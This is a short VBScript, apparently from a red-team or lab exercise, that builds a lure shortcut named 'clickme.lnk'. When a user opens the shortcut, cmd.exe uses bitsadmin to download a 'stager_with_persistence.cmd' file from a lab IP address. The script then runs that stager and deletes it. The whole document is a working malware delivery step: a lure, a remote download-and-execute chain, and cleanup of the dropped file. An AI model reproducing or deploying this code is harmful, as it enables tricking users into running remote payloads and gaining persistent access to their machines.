Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "clickme.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\cmd.exe"
oLink.Arguments = "/c bitsadmin /transfer attackjob_persistance /priority FOREGROUND http://192.168.56.1/stager_with_persistence.cmd C:\Users\Public\Libraries\stager_with_persistence.cmd & call C:\Users\Public\Libraries\stager_with_persistence.cmd & del C:\Users\Public\Libraries\stager_with_persistence.cmd"
oLink.Save